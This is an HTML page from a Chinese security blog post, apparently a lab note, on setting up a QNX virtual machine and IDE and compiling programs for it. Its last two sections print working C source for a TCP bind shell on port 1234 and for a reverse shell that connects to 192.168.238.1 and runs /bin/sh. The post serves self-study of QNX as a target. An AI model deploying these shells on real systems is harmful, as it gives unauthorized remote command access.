@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>QNX | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="环境来源虚拟机 6.5.0：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;2a3d7e80a725官方 6.4.1 版虚拟机：http:&#x2F;&#x2F;www.qnx.com&#x2F;download&#x2F;group.html?programid&#x3D;20840IDE：https:&#x2F;&#x2F;download.freedownloadmanager.org&#x2F;Windows-PC&#x2F;Momentics-IDE-for-BlackB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QNX">
+<meta property="og:url" content="https://yichen115.github.io/2022/04/07/nkd6cf/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="环境来源虚拟机 6.5.0：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;2a3d7e80a725官方 6.4.1 版虚拟机：http:&#x2F;&#x2F;www.qnx.com&#x2F;download&#x2F;group.html?programid&#x3D;20840IDE：https:&#x2F;&#x2F;download.freedownloadmanager.org&#x2F;Windows-PC&#x2F;Momentics-IDE-for-BlackB">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649293209901-299abd9d-8a73-4749-b3ef-0edfe631ccbb.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=274&id=u50ab76ae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=393&originWidth=500&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=12153&status=done&style=none&taskId=u0cacfaaa-0b6f-4373-a888-a88246fa198&title=&width=348.9999694824219">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649294485898-d76e4203-5411-49c8-aed4-790932cb2a90.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=154&id=u7cb08c2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=534&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=11612&status=done&style=none&taskId=u56cbfdf3-fcaa-4734-a82e-571628b36d4&title=&width=410.1119874843754">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649294484204-e16d5d24-ab3c-4f91-ac22-3f9b64e76ea5.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=458&id=u7898424f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=597&originWidth=692&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=31369&status=done&style=none&taskId=uafeffed7-7a82-49c2-b4f9-4c067f9a746&title=&width=531.4559837812504">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649294272004-37e1760c-b0d2-4a90-a186-c299ca3f2f75.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=107&id=u0def6f09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=139&originWidth=602&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=7450&status=done&style=none&taskId=uf4b9861e-b764-42b0-affd-158955aefbc&title=&width=462.3359858906254">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649295782071-1aabf764-f539-46f4-b977-c113f0a5f3c4.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=374&id=XzGct&margin=%5Bobject%20Object%5D&name=image.png&originHeight=487&originWidth=725&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=21142&status=done&style=none&taskId=u4b2ae80d-1218-47cb-9efd-a25f6730d45&title=&width=556.799983007813">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649296318284-82fa2975-8860-4699-aded-013b13778d45.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=148&id=ueff85ace&margin=%5Bobject%20Object%5D&name=image.png&originHeight=193&originWidth=572&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=16041&status=done&style=none&taskId=u491724df-3ffc-49d8-aa29-d632555f83a&title=&width=439.2959865937504">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649296287571-71eefcba-42f4-4b55-bacc-70fdcbc954a1.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=330&id=u94f1ca1d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=430&originWidth=684&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=16163&status=done&style=none&taskId=u1732a184-2d32-4dd6-b43a-8b6049dcfea&title=&width=525.3119839687505">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649296423229-3f1e762b-08f7-400d-b8b5-7eb4bb3860ea.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=296&id=u2c798343&margin=%5Bobject%20Object%5D&name=image.png&originHeight=386&originWidth=843&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=33640&status=done&style=none&taskId=u0d31d8c4-c736-4673-b45f-6eeb8ca5671&title=&width=647.4239802421881">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649306167791-57943f35-2e2f-4bde-9a41-16c8d4dcb2b8.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=366&id=ubaa6bb2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=477&originWidth=745&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=19402&status=done&style=none&taskId=ubfd808e3-61c0-4b16-8efb-c0d86645359&title=&width=572.159982539063">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649313465392-b61ed102-9d30-4269-bc8a-94ea47dad44c.png#clientId=ubb10f339-4cff-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=136&id=u1603385a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=177&originWidth=416&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=10441&status=done&style=none&taskId=u3fbd0a37-d380-4159-ba62-22e4ed208aa&title=&width=319.4879902500003">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649313567110-b8e51a90-9edf-4706-b5cb-1227783c00ef.png#clientId=ubb10f339-4cff-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=260&id=u1b424d4c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=339&originWidth=1036&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=22704&status=done&style=none&taskId=u4e601974-5ecd-49b0-8269-9b6e70e4fdb&title=&width=795.6479757187508">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649313290290-bbf5b3d7-29c3-4e2e-b699-607c94e5933b.png#clientId=ubb10f339-4cff-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=80&id=u1c29dd43&margin=%5Bobject%20Object%5D&name=image.png&originHeight=104&originWidth=464&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=25948&status=done&style=none&taskId=ue8d60bc2-3048-455c-806a-9807e7cb5b8&title=&width=356.35198912500033">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649313734807-311d3c32-ab85-4a57-9518-021a5dcf6682.png#clientId=ubb10f339-4cff-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=104&id=u214b1beb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=136&originWidth=553&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=25706&status=done&style=none&taskId=ufafbcf24-bd02-4bbb-87cf-704635a899a&title=&width=424.7039870390629">
+<meta property="article:published_time" content="2022-04-07T00:56:01.000Z">
+<meta property="article:modified_time" content="2022-10-03T13:52:43.806Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2022/png/268938/1649293209901-299abd9d-8a73-4749-b3ef-0edfe631ccbb.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=274&id=u50ab76ae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=393&originWidth=500&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=12153&status=done&style=none&taskId=u0cacfaaa-0b6f-4373-a888-a88246fa198&title=&width=348.9999694824219">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">QNX</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">QNX</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-04-07T00:56:01.000Z" itemprop="datePublished" class="page-time">
+  2022-04-07
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#环境来源"><span class="post-toc-number">1.</span> <span class="post-toc-text">环境来源</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#环境安装"><span class="post-toc-number">2.</span> <span class="post-toc-text">环境安装</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#QNX-的命令"><span class="post-toc-number">3.</span> <span class="post-toc-text">QNX 的命令</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#helloworld"><span class="post-toc-number">4.</span> <span class="post-toc-text">helloworld</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#TCP-bind-shell"><span class="post-toc-number">5.</span> <span class="post-toc-text">TCP bind shell</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Reverse-TCP-shell"><span class="post-toc-number">6.</span> <span class="post-toc-text">Reverse TCP shell</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-nkd6cf"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">QNX</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-04-07 08:56:01" datetime="2022-04-07T00:56:01.000Z"  itemprop="datePublished">2022-04-07</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="环境来源"><a href="#环境来源" class="headerlink" title="环境来源"></a>环境来源</h1><p>虚拟机 6.5.0：<a href="https://www.jianshu.com/p/2a3d7e80a725" target="_blank" rel="noopener">https://www.jianshu.com/p/2a3d7e80a725</a><br>官方 6.4.1 版虚拟机：<a href="http://www.qnx.com/download/group.html?programid=20840" target="_blank" rel="noopener">http://www.qnx.com/download/group.html?programid=20840</a><br>IDE：<a href="https://download.freedownloadmanager.org/Windows-PC/Momentics-IDE-for-BlackBerry/FREE-2.0.html" target="_blank" rel="noopener">https://download.freedownloadmanager.org/Windows-PC/Momentics-IDE-for-BlackBerry/FREE-2.0.html</a></p>
+<h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><p>虚拟机直接打开运行就行了，IDE 直接安装就行了，注意安装好 IDE 之后打开选择 workspace 的时候不能包含空格，然后打开会提示没法下载 SDK，不用慌，关了就行，去界面的 help -&gt; Update API Levels 下载就行</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649293209901-299abd9d-8a73-4749-b3ef-0edfe631ccbb.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=274&id=u50ab76ae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=393&originWidth=500&originalType=binary∶=1&rotation=0&showTitle=false&size=12153&status=done&style=none&taskId=u0cacfaaa-0b6f-4373-a888-a88246fa198&title=&width=348.9999694824219" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="QNX-的命令"><a href="#QNX-的命令" class="headerlink" title="QNX 的命令"></a>QNX 的命令</h1><p><a href="https://bbs.pediy.com/thread-270996.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-270996.htm</a><br>按着这个手册自己试试就行了，跟 linux 的命令还是有很多重合的<br>很奇怪，我的镜像里面没有 gdb 啥的，各种命令好像还得看镜像</p>
+<h1 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h1><p>新建一个 QNX C Project</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649294485898-d76e4203-5411-49c8-aed4-790932cb2a90.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=154&id=u7cb08c2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=534&originalType=binary∶=1&rotation=0&showTitle=false&size=11612&status=done&style=none&taskId=u56cbfdf3-fcaa-4734-a82e-571628b36d4&title=&width=410.1119874843754" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>选择架构为 x86</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649294484204-e16d5d24-ab3c-4f91-ac22-3f9b64e76ea5.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=458&id=u7898424f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=597&originWidth=692&originalType=binary∶=1&rotation=0&showTitle=false&size=31369&status=done&style=none&taskId=uafeffed7-7a82-49c2-b4f9-4c067f9a746&title=&width=531.4559837812504" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>创建好之后看一下 QNX 的 IP，然后运行 qconn</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649294272004-37e1760c-b0d2-4a90-a186-c299ca3f2f75.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=107&id=u0def6f09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=139&originWidth=602&originalType=binary∶=1&rotation=0&showTitle=false&size=7450&status=done&style=none&taskId=uf4b9861e-b764-42b0-affd-158955aefbc&title=&width=462.3359858906254" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>然后给 IDE 加上设备，选择 Window -&gt; Target Navigator</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649295782071-1aabf764-f539-46f4-b977-c113f0a5f3c4.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=374&id=XzGct&margin=%5Bobject%20Object%5D&name=image.png&originHeight=487&originWidth=725&originalType=binary∶=1&rotation=0&showTitle=false&size=21142&status=done&style=none&taskId=u4b2ae80d-1218-47cb-9efd-a25f6730d45&title=&width=556.799983007813" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>在打开的窗口右键找到这个小摁钮，选择 New QNX Target</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649296318284-82fa2975-8860-4699-aded-013b13778d45.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=148&id=ueff85ace&margin=%5Bobject%20Object%5D&name=image.png&originHeight=193&originWidth=572&originalType=binary∶=1&rotation=0&showTitle=false&size=16041&status=done&style=none&taskId=u491724df-3ffc-49d8-aa29-d632555f83a&title=&width=439.2959865937504" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649296287571-71eefcba-42f4-4b55-bacc-70fdcbc954a1.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=330&id=u94f1ca1d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=430&originWidth=684&originalType=binary∶=1&rotation=0&showTitle=false&size=16163&status=done&style=none&taskId=u1732a184-2d32-4dd6-b43a-8b6049dcfea&title=&width=525.3119839687505" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>先点锤子再点运行</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649296423229-3f1e762b-08f7-400d-b8b5-7eb4bb3860ea.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=296&id=u2c798343&margin=%5Bobject%20Object%5D&name=image.png&originHeight=386&originWidth=843&originalType=binary∶=1&rotation=0&showTitle=false&size=33640&status=done&style=none&taskId=u0d31d8c4-c736-4673-b45f-6eeb8ca5671&title=&width=647.4239802421881" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>在这里甚至可以直接拖拽上传文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649306167791-57943f35-2e2f-4bde-9a41-16c8d4dcb2b8.png#clientId=ue3213a23-c538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=366&id=ubaa6bb2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=477&originWidth=745&originalType=binary∶=1&rotation=0&showTitle=false&size=19402&status=done&style=none&taskId=ubfd808e3-61c0-4b16-8efb-c0d86645359&title=&width=572.159982539063" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="TCP-bind-shell"><a href="#TCP-bind-shell" class="headerlink" title="TCP bind shell"></a>TCP bind shell</h1><p>看看咋写程序，结果发现跟 linux 没啥区别，直接用的下面的代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="tag">&lt;<span class="name">sys</span>/<span class="attr">socket.h</span>&gt;</span> #include <span class="tag">&lt;<span class="name">sys</span>/<span class="attr">types.h</span>&gt;</span> #include</span><br><span class="line"><span class="tag">&lt;<span class="name">stdlib.h</span>&gt;</span></span><br><span class="line">  #include</span><br><span class="line">  <span class="tag">&lt;<span class="name">unistd.h</span>&gt;</span></span><br><span class="line">    #include <span class="tag">&lt;<span class="name">netinet</span>/<span class="attr">in.h</span>&gt;</span> int main(void) &#123; int clientfd, sockfd; int port =</span><br><span class="line">    1234; //设置绑定的端口 struct sockaddr_in mysockaddr; sockfd =</span><br><span class="line">    socket(AF_INET, SOCK_STREAM, 0); mysockaddr.sin_family = AF_INET;</span><br><span class="line">    mysockaddr.sin_port = htons(port); mysockaddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    bind(sockfd, (struct sockaddr *) &amp;mysockaddr, sizeof(mysockaddr));</span><br><span class="line">    listen(sockfd, 1); clientfd = accept(sockfd, NULL, NULL); dup2(clientfd, 0);</span><br><span class="line">    dup2(clientfd, 1); dup2(clientfd, 2); char * const argv[] = &#123;"sh",NULL,</span><br><span class="line">    NULL&#125;; execve("/bin/sh", argv, NULL); return 0; &#125;<span class="tag">&lt;/<span class="name">unistd.h</span></span></span><br><span class="line"><span class="tag">  &gt;</span><span class="tag">&lt;/<span class="name">stdlib.h</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要在项目右键选择 Properties</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649313465392-b61ed102-9d30-4269-bc8a-94ea47dad44c.png#clientId=ubb10f339-4cff-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=136&id=u1603385a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=177&originWidth=416&originalType=binary∶=1&rotation=0&showTitle=false&size=10441&status=done&style=none&taskId=u3fbd0a37-d380-4159-ba62-22e4ed208aa&title=&width=319.4879902500003" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>然后找到 QNX C/C++ Project 里面的 Linker，在 Category 里面选择 Extra libraries，再选择 Nx targetzhege 这个<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649313567110-b8e51a90-9edf-4706-b5cb-1227783c00ef.png#clientId=ubb10f339-4cff-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=260&id=u1b424d4c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=339&originWidth=1036&originalType=binary∶=1&rotation=0&showTitle=false&size=22704&status=done&style=none&taskId=u4e601974-5ecd-49b0-8269-9b6e70e4fdb&title=&width=795.6479757187508" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><br>在 x86 的 lib 里面找到 libsocket.so 打开，然后编译运行就完事了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649313290290-bbf5b3d7-29c3-4e2e-b699-607c94e5933b.png#clientId=ubb10f339-4cff-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=80&id=u1c29dd43&margin=%5Bobject%20Object%5D&name=image.png&originHeight=104&originWidth=464&originalType=binary∶=1&rotation=0&showTitle=false&size=25948&status=done&style=none&taskId=ue8d60bc2-3048-455c-806a-9807e7cb5b8&title=&width=356.35198912500033" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="Reverse-TCP-shell"><a href="#Reverse-TCP-shell" class="headerlink" title="Reverse TCP shell"></a>Reverse TCP shell</h1><p>同理，代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="tag">&lt;<span class="name">sys</span>/<span class="attr">socket.h</span>&gt;</span> #include <span class="tag">&lt;<span class="name">sys</span>/<span class="attr">types.h</span>&gt;</span> #include</span><br><span class="line"><span class="tag">&lt;<span class="name">stdlib.h</span>&gt;</span></span><br><span class="line">  #include</span><br><span class="line">  <span class="tag">&lt;<span class="name">unistd.h</span>&gt;</span></span><br><span class="line">    #include <span class="tag">&lt;<span class="name">netinet</span>/<span class="attr">in.h</span>&gt;</span> #include <span class="tag">&lt;<span class="name">arpa</span>/<span class="attr">inet.h</span>&gt;</span> int main(void) &#123; int sockfd;</span><br><span class="line">    int port = 1234; struct sockaddr_in mysockaddr; sockfd = socket(AF_INET,</span><br><span class="line">    SOCK_STREAM, 0); mysockaddr.sin_family = AF_INET; mysockaddr.sin_port =</span><br><span class="line">    htons(port); mysockaddr.sin_addr.s_addr = inet_addr("192.168.238.1");</span><br><span class="line">    connect(sockfd, (struct sockaddr *) &amp;mysockaddr,sizeof(mysockaddr));</span><br><span class="line">    dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2); char * const argv[] =</span><br><span class="line">    &#123;"/bin/sh", NULL&#125;; execve("/bin/sh", argv, NULL); return 0; &#125;<span class="tag">&lt;/<span class="name">unistd.h</span></span></span><br><span class="line"><span class="tag">  &gt;</span><span class="tag">&lt;/<span class="name">stdlib.h</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2022/png/268938/1649313734807-311d3c32-ab85-4a57-9518-021a5dcf6682.png#clientId=ubb10f339-4cff-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=104&id=u214b1beb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=136&originWidth=553&originalType=binary∶=1&rotation=0&showTitle=false&size=25706&status=done&style=none&taskId=ufafbcf24-bd02-4bbb-87cf-704635a899a&title=&width=424.7039870390629" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2022-10-03T13:52:43.806Z" itemprop="dateUpdated">2022-10-03 21:52:43</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2022/04/07/nkd6cf/&title=《QNX》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
